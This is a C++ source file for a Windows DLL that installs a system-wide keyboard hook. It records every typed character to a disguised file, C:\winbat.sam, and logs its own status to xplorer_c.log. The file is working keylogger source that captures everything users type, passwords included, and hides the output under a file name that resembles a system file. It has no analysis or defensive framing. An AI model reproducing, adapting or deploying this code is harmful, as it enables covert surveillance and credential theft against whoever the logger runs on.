// kHookdll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <stdio.h>
#include <Shellapi.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <tchar.h>
#include <errno.h>


#define TRUNCATE_SIZE	1024		//kb

HHOOK hkb=NULL;
HINSTANCE hInst;


extern "C" BOOL __declspec(dllexport) InstallHook();
extern "C" BOOL __declspec(dllexport)  UnHook();
bool TruncateFile(const TCHAR* filepath, int size);
void ShowMessage(const TCHAR *tszMsg);

LRESULT __declspec(dllexport)__stdcall  CALLBACK KeyboardProc(
                            int nCode, 
                            WPARAM wParam, 
                            LPARAM lParam);


BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	hInst = (HINSTANCE)hModule;

    return TRUE;
}

LRESULT __declspec(dllexport)__stdcall  CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char ch;	
	FILE *fp;

	do
	{
		if (((DWORD)lParam & 0x40000000) &&(HC_ACTION==nCode))
		{		
			if ((wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam>=0x2f ) &&(wParam<=0x100))
			{
		
				char buff[MAX_PATH];
				//GetTempPath(MAX_PATH, buff);
				strcpy(buff, "C:\\");
				strcat(buff,"\\winbat.sam");

				fp=fopen(buff,"a+");
				if(fp == NULL)
				{
					break;
				}
				if (wParam==VK_RETURN)
				{	
					ch='\n';
					fwrite(&ch,1,1,fp);
				}
				else
				{
   					BYTE ks[256];
					GetKeyboardState(ks);
					WORD w;
					UINT scan;
					scan=0;
					ToAscii(wParam,scan,ks,&w,0);
					ch =char(w); 
					fwrite(&ch,1,1,fp);
				}
    
			fclose(fp);
			}
  
		}
	}while(0);

	return CallNextHookEx( hkb, nCode, wParam, lParam );
}


extern "C" BOOL __declspec(dllexport) InstallHook()
{
	FILE *fp;

	char buff[MAX_PATH];
	//GetTempPath(MAX_PATH, buff);
	strcpy(buff, "C:\\");
	strcat(buff,"\\winbat.sam");

	fp=fopen(buff,"a+");
	if(fp == NULL)
	{
		ShowMessage(_T("Can't hook the keyboard"));
		int err;
		printf("%d", _get_errno(&err) );
		return TRUE;
	}
	fclose(fp);
	hkb=SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyboardProc,hInst,0);
	ShowMessage("Hooked the keyboard.");

	return TRUE;
}


extern "C" BOOL __declspec(dllexport)  UnHook()
{
    	
     BOOL unhooked = UnhookWindowsHookEx(hkb);
	 ShowMessage("Unhooked the keyboard.");
     return unhooked;
} 

void ShowMessage(const TCHAR *tszMsg)
{
	//LoadString(hInst, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	//LoadString(hInst, IDC_XPLORER_C, szWindowClass, MAX_LOADSTRING);
	char logpath[MAX_PATH];
	//GetTempPath(MAX_PATH, logpath);
	strcpy(logpath, "C:\\");
	strcat(logpath, "\\xplorer_c.log");
	FILE *fp;

	//truncate file, if the reaches TRUNCATE_SIZE
	if(TruncateFile(logpath, TRUNCATE_SIZE))
	{
		fp = fopen(logpath, "w");
	}
	else
	{
		fp = fopen(logpath, "a");
	}


	if(fp == NULL)
		return;

	fwrite(tszMsg, sizeof(char), strlen(tszMsg), fp);
	fwrite("\n", sizeof(char), 1, fp);

	fclose(fp);

	//MessageBox(FindWindow(szWindowClass,szTitle),tszMsg,_T("Xplorer Client"),0);

}

bool TruncateFile(const TCHAR* filepath, int size)
{
	struct _stat buffer;

	_stat(filepath, &buffer);
	if((buffer.st_size / 1024) > size)
	{
		return true;
	}

	return false;
}
